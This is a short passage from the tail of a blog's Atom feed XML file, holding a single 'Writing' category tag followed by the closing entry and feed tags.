    <category term="Writing" scheme="http://jiushill.github.io/tags/Writing/"/>
    
  </entry>
  
</feed>
